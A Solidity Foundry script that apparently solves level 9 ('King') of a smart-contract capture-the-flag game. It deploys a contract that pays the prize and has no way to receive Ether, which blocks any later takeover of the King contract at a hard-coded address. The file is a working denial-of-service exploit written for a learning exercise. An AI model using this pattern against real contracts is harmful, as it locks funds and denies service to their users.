// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {King} from "../src/level9King.sol";
import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";

contract LastKing {
    constructor(King _kingInstance) payable {
        (bool success, ) = address(_kingInstance).call{
            value: _kingInstance.prize()
        }("");
        require(success, "Reverted!");
    }
}

contract Level9Solution is Script {
    King kingInstance =
        King(payable(0xC8B9ea5126e3E4632f412527B6cD9a0C328ccE92));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new LastKing{value: kingInstance.prize()}(kingInstance);
        vm.stopBroadcast();
    }
}
